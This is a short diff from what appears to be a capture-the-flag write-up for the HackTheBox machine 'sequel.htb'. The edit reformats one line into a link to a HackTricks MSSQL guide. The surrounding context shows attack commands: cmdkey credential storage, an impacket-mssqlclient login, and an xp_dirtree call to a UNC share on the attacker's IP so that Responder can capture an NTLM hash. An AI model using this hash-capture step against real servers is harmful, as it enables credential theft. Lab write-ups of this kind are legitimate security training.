@@ -27,7 +27,7 @@ cmdkey /add:"servername.sequel.htb" /user:"sequel\username" /pass:"password"
 impacket-mssqlclient sequel.htb/PublicUser@dc.sequel.htb -dc-ip 10.129.25.121
 ```
 
-- using the hacktricks guide, we can use responder to connect back to our machine and capture a hash - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#manual
+- [Using the hacktricks guide, we can use responder to connect back to our machine and capture a hash](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#manual)
 
 ```bash
 exec master.dbo.xp_dirtree '\\10.10.14.91\share'
